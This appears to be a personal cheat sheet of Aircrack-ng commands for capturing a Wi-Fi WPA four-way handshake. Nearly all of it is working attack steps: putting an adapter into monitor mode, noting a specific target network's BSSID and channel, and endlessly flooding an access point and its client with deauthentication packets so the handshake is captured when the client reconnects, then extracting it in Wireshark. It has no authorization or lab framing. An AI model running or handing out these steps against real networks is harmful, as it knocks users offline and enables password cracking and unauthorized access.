* This uses the Aircrack-ng suite

============= NETWORK ADAPTER SETUP ===============
# check for any interfering processes
sudo airmon-ng check kill

# check what mode the network adapter is in (default is Managed)
iwconfig

# put the network adapter into Monitor mode
sudo airmon-ng start <interface>

# set frequency to 5GHz (if can't see 5g networks)
sudo iw wlan0 set freq 5745 80 5775

# discover 5GHz wifi networks (may need to reconnect the network adapter)
sudo airodump-ng <interface> --band a

# note the channel (CH) and mac address (BSSID) of the target
CH - 44
BSSID - 88:DE:7C:FE:20:BF

# find devices that connect to a specific network (will appear under "Station")
sudo airodump-ng <interface> --bssid <BSSID>


============== OPEN IN TWO TERMINALS ==============
* capture four-way hand shake using channel and mac address of a wifi network by sending a bunch of deauth packets endlessly

# start the listener
sudo airodump-ng <interface> -w <output_file> -b <band> --bssid <BSSID>

# send deauth packets (broadcast or targeted)
sudo aireplay-ng <interface> --deauth 0 -a <BSSID> -c <target_MAC>
a: access point
c: client
--deauth 0: endlessly send deauth 

* if receive error: "<interface> is on channel x but the AP is on channel y..."
sudo airmon-ng start wlan0 <specific_channel>
or 
append -D to aireplay-ng 

* when client tries to reconnect, you will capture the handshake 


============== RETRIEVE THE HANDSHAKE =============
* open wireshark, search EAPOL (extensible authentication protocol over LAN). You will see 4 results.

* 4 way handshake: https://medium.com/wifi-testing/four-way-handshake-32356fbec1b5
